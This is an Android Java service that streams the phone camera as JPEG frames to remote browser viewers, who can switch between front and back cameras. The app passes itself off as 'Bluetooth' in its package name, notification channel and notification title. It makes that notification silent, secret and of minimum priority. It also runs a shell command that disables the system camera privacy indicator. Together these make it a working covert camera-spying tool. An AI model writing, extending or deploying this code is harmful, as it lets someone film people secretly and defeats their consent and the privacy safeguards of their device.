package com.Bluetooth;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import android.util.Size;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraStreamService extends Service {

    private static final String TAG = "CameraStreamService";
    private static final String CHANNEL_ID = "Bluetooth_channel";
    private static final int NOTIF_ID = 1;

    public static final String ACTION_START       = "com.Bluetooth.START";
    public static final String ACTION_STOP        = "com.Bluetooth.STOP";
    public static final String ACTION_SWITCH_CAM  = "com.Bluetooth.SWITCH_CAM";
    public static final String ACTION_SET_QUALITY = "com.Bluetooth.SET_QUALITY";
    public static final String ACTION_SET_RES     = "com.Bluetooth.SET_RES";

    public static final String BROADCAST_STATUS = "com.Bluetooth.STATUS";
    public static final String EXTRA_VIEWERS    = "viewers";
    public static final String EXTRA_FPS        = "fps";
    public static final String EXTRA_RUNNING    = "running";
    public static final String EXTRA_FACING     = "facing";
    public static final String EXTRA_QUALITY    = "quality";
    public static final String EXTRA_RES        = "res";

    public static final int[][] RESOLUTIONS = {
        {480, 360},
        {854, 480},
        {1280, 720},
    };

    private StreamServer server;
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private HandlerThread encodeThread;
    private Handler encodeHandler;

    // Shared mutable settings — read on encode thread, written from main thread
    private volatile int facing  = CameraCharacteristics.LENS_FACING_BACK;
    private volatile int quality = 50;
    private volatile int resIdx  = 1;

    private final AtomicBoolean encoding = new AtomicBoolean(false);
    private volatile boolean running = false;
    private int frameCount = 0;
    private long lastFpsTime = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        String action = intent.getAction();
        if (action == null) return START_NOT_STICKY;

        switch (action) {
            case ACTION_START:
                facing  = intent.getIntExtra(EXTRA_FACING, CameraCharacteristics.LENS_FACING_BACK);
                quality = intent.getIntExtra(EXTRA_QUALITY, 50);
                resIdx  = intent.getIntExtra(EXTRA_RES, 1);
                startStreaming();
                break;
            case ACTION_STOP:
                stopStreaming();
                stopSelf();
                break;
            case ACTION_SWITCH_CAM:
                facing = intent.getIntExtra(EXTRA_FACING, facing);
                if (running) restartCamera();
                break;
            case ACTION_SET_QUALITY:
                quality = intent.getIntExtra(EXTRA_QUALITY, quality);
                // Quality change takes effect on next frame — no restart needed
                break;
            case ACTION_SET_RES:
                resIdx = intent.getIntExtra(EXTRA_RES, resIdx);
                if (running) restartCamera();
                break;
        }
        return START_NOT_STICKY;
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() { stopStreaming(); super.onDestroy(); }

    // ── Start / Stop ─────────────────────────────────────────────────────────

    private void startStreaming() {
        if (running) return;
        running = true;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIF_ID, buildNotification("Running"));
        }

        // Try to hide camera indicator (works on rooted / shell-granted devices)
        hideCameraIndicator();

        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());

        encodeThread = new HandlerThread("EncodeThread", Thread.MAX_PRIORITY);
        encodeThread.start();
        encodeHandler = new Handler(encodeThread.getLooper());

        server = new StreamServer(this, count -> broadcastStatus(count, 0));
        try {
            server.start();
        } catch (IOException e) {
            Log.e(TAG, "Server start failed", e);
            stopSelf();
            return;
        }

        openCamera();
        broadcastStatus(0, 0);
    }

    private void stopStreaming() {
        if (!running) return;
        running = false;
        closeCamera();
        if (cameraThread != null) { cameraThread.quitSafely(); cameraThread = null; }
        if (encodeThread != null) { encodeThread.quitSafely(); encodeThread = null; }
        cameraHandler = null;
        encodeHandler = null;
        if (server != null) { server.stop(); server = null; }
        broadcastStatus(0, 0);
    }

    private void restartCamera() {
        encoding.set(false);
        closeCamera();
        openCamera();
    }

    // ── Run shell command to hide camera privacy indicator ────────────────────

    private void hideCameraIndicator() {
        try {
            Runtime.getRuntime().exec(new String[]{
                "sh", "-c",
                "cmd device_config put privacy camera_mic_icons_enabled false"
            });
            Log.d(TAG, "camera_mic_icons_enabled → false");
        } catch (Exception e) {
            Log.d(TAG, "hideCameraIndicator not available: " + e.getMessage());
        }
    }

    // ── Camera ───────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private void openCamera() {
        try {
            String cameraId = getCameraId(facing);
            if (cameraId == null) return;

            int[] res = RESOLUTIONS[resIdx];
            Size size = chooseSize(cameraId, res[0], res[1]);
            Log.d(TAG, "Camera facing=" + facing + " size=" + size.getWidth() + "x" + size.getHeight());

            imageReader = ImageReader.newInstance(
                size.getWidth(), size.getHeight(), ImageFormat.YUV_420_888, 2);

            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image == null) return;
                try {
                    if (!encoding.compareAndSet(false, true)) return;
                    if (!running || server == null || server.getViewerCount() == 0) {
                        encoding.set(false);
                        return;
                    }

                    final int w  = image.getWidth();
                    final int h  = image.getHeight();
                    final int q  = quality;

                    // Convert YUV with CORRECT row stride handling
                    final byte[] nv21 = yuv420ToNv21Strided(image);
                    if (nv21 == null) { encoding.set(false); return; }

                    encodeHandler.post(() -> {
                        try {
                            YuvImage yuv = new YuvImage(nv21, ImageFormat.NV21, w, h, null);
                            ByteArrayOutputStream out = new ByteArrayOutputStream(w * h / 4);
                            yuv.compressToJpeg(new Rect(0, 0, w, h), q, out);
                            if (server != null && running) {
                                server.broadcastFrame(out.toByteArray());
                                countFps();
                            }
                        } finally {
                            encoding.set(false);
                        }
                    });
                } finally {
                    image.close();
                }
            }, cameraHandler);

            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(@NonNull CameraDevice cam) {
                    cameraDevice = cam; createCaptureSession();
                }
                @Override public void onDisconnected(@NonNull CameraDevice cam) {
                    cam.close(); cameraDevice = null;
                }
                @Override public void onError(@NonNull CameraDevice cam, int err) {
                    Log.e(TAG, "Camera error " + err); cam.close(); cameraDevice = null;
                }
            }, cameraHandler);

        } catch (CameraAccessException e) {
            Log.e(TAG, "openCamera", e);
        }
    }

    /**
     * Correct YUV_420_888 → NV21 conversion respecting rowStride and pixelStride.
     * This is the fix for the green/corrupted image bug.
     */
    private byte[] yuv420ToNv21Strided(Image image) {
        try {
            int width  = image.getWidth();
            int height = image.getHeight();

            Image.Plane yPlane = image.getPlanes()[0];
            Image.Plane uPlane = image.getPlanes()[1];
            Image.Plane vPlane = image.getPlanes()[2];

            ByteBuffer yBuf = yPlane.getBuffer();
            ByteBuffer uBuf = uPlane.getBuffer();
            ByteBuffer vBuf = vPlane.getBuffer();

            int yRowStride  = yPlane.getRowStride();
            int uvRowStride = vPlane.getRowStride();
            int uvPixStride = vPlane.getPixelStride();

            byte[] nv21 = new byte[width * height * 3 / 2];

            // --- Y plane ---
            // rowStride may be >= width; copy only width pixels per row
            byte[] yRow = new byte[width];
            for (int row = 0; row < height; row++) {
                yBuf.position(row * yRowStride);
                yBuf.get(yRow, 0, width);
                System.arraycopy(yRow, 0, nv21, row * width, width);
            }

            // --- UV plane → NV21 interleaved (V first, then U) ---
            int uvHeight = height / 2;
            int uvWidth  = width / 2;
            int ySize    = width * height;

            if (uvPixStride == 1) {
                // Fully planar: V and U are separate, need to interleave
                byte[] vRow = new byte[uvWidth];
                byte[] uRow = new byte[uvWidth];
                for (int row = 0; row < uvHeight; row++) {
                    vBuf.position(row * uvRowStride);
                    vBuf.get(vRow, 0, uvWidth);
                    uBuf.position(row * uvRowStride);
                    uBuf.get(uRow, 0, uvWidth);
                    for (int col = 0; col < uvWidth; col++) {
                        nv21[ySize + row * width + col * 2]     = vRow[col];
                        nv21[ySize + row * width + col * 2 + 1] = uRow[col];
                    }
                }
            } else {
                // Semi-planar with pixel stride (most common on Android)
                // vBuf already contains interleaved VUVUVU data starting at v position
                for (int row = 0; row < uvHeight; row++) {
                    for (int col = 0; col < uvWidth; col++) {
                        int srcPos = row * uvRowStride + col * uvPixStride;
                        nv21[ySize + row * width + col * 2]     = vBuf.get(srcPos);
                        nv21[ySize + row * width + col * 2 + 1] = uBuf.get(srcPos);
                    }
                }
            }

            return nv21;
        } catch (Exception e) {
            Log.e(TAG, "yuv420ToNv21", e);
            return null;
        }
    }

    private void createCaptureSession() {
        if (cameraDevice == null || imageReader == null) return;
        try {
            cameraDevice.createCaptureSession(
                Arrays.asList(imageReader.getSurface()),
                new CameraCaptureSession.StateCallback() {
                    @Override public void onConfigured(@NonNull CameraCaptureSession s) {
                        captureSession = s; startCapture();
                    }
                    @Override public void onConfigureFailed(@NonNull CameraCaptureSession s) {
                        Log.e(TAG, "Session configure failed");
                    }
                }, cameraHandler);
        } catch (CameraAccessException e) { Log.e(TAG, "createSession", e); }
    }

    private void startCapture() {
        if (captureSession == null || cameraDevice == null) return;
        try {
            CaptureRequest.Builder b = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            b.addTarget(imageReader.getSurface());
            b.set(CaptureRequest.CONTROL_MODE,        CaptureRequest.CONTROL_MODE_AUTO);
            b.set(CaptureRequest.CONTROL_AF_MODE,     CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
            b.set(CaptureRequest.CONTROL_AE_MODE,     CaptureRequest.CONTROL_AE_MODE_ON);
            b.set(CaptureRequest.EDGE_MODE,           CaptureRequest.EDGE_MODE_FAST);
            b.set(CaptureRequest.NOISE_REDUCTION_MODE,CaptureRequest.NOISE_REDUCTION_MODE_FAST);
            captureSession.setRepeatingRequest(b.build(), null, cameraHandler);
        } catch (CameraAccessException e) { Log.e(TAG, "startCapture", e); }
    }

    private void closeCamera() {
        if (captureSession != null) {
            try { captureSession.stopRepeating(); } catch (Exception ignored) {}
            captureSession.close(); captureSession = null;
        }
        if (cameraDevice  != null) { cameraDevice.close();  cameraDevice  = null; }
        if (imageReader   != null) { imageReader.close();   imageReader   = null; }
    }

    private String getCameraId(int facingTarget) throws CameraAccessException {
        for (String id : cameraManager.getCameraIdList()) {
            Integer f = cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
            if (f != null && f == facingTarget) return id;
        }
        String[] ids = cameraManager.getCameraIdList();
        return ids.length > 0 ? ids[0] : null;
    }

    private Size chooseSize(String id, int pw, int ph) throws CameraAccessException {
        android.hardware.camera2.params.StreamConfigurationMap map =
            cameraManager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        if (map == null) return new Size(pw, ph);
        Size[] sizes = map.getOutputSizes(ImageFormat.YUV_420_888);
        if (sizes == null || sizes.length == 0) return new Size(pw, ph);
        for (Size s : sizes) if (s.getWidth() == pw && s.getHeight() == ph) return s;
        Size best = null;
        for (Size s : sizes)
            if (s.getWidth() <= pw && s.getHeight() <= ph)
                if (best == null || s.getWidth() * s.getHeight() > best.getWidth() * best.getHeight())
                    best = s;
        return best != null ? best : sizes[sizes.length - 1];
    }

    // ── Settings from browser (called by StreamServer) ────────────────────────

    public void setQualityFromBrowser(int q) {
        quality = Math.max(10, Math.min(95, q));
        Intent i = new Intent(ACTION_SET_QUALITY);
        i.putExtra(EXTRA_QUALITY, quality);
        // Just update field — no restart needed
    }

    public void setResFromBrowser(int idx) {
        if (idx < 0 || idx >= RESOLUTIONS.length) return;
        resIdx = idx;
        if (running) restartCamera();
    }

    public void switchCameraFromBrowser() {
        facing = (facing == CameraCharacteristics.LENS_FACING_BACK)
            ? CameraCharacteristics.LENS_FACING_FRONT
            : CameraCharacteristics.LENS_FACING_BACK;
        if (running) restartCamera();
        broadcastStatus(server != null ? server.getViewerCount() : 0, 0);
    }

    public int getQuality()  { return quality; }
    public int getResIdx()   { return resIdx; }
    public int getFacing()   { return facing; }

    // ── FPS & broadcast ───────────────────────────────────────────────────────

    private void countFps() {
        frameCount++;
        long now = System.currentTimeMillis();
        if (now - lastFpsTime >= 1000) {
            broadcastStatus(server != null ? server.getViewerCount() : 0, frameCount);
            frameCount = 0; lastFpsTime = now;
        }
    }

    private void broadcastStatus(int viewers, int fps) {
        Intent i = new Intent(BROADCAST_STATUS);
        i.putExtra(EXTRA_VIEWERS, viewers);
        i.putExtra(EXTRA_FPS, fps);
        i.putExtra(EXTRA_RUNNING, running);
        sendBroadcast(i);
    }

    // ── Notification ─────────────────────────────────────────────────────────

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Bluetooth", NotificationManager.IMPORTANCE_NONE);
            ch.setShowBadge(false); ch.setSound(null, null);
            ch.enableLights(false); ch.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification(String text) {
        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0;
        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), flags);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Bluetooth").setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_camera).setContentIntent(pi)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).setOngoing(true).build();
    }
}
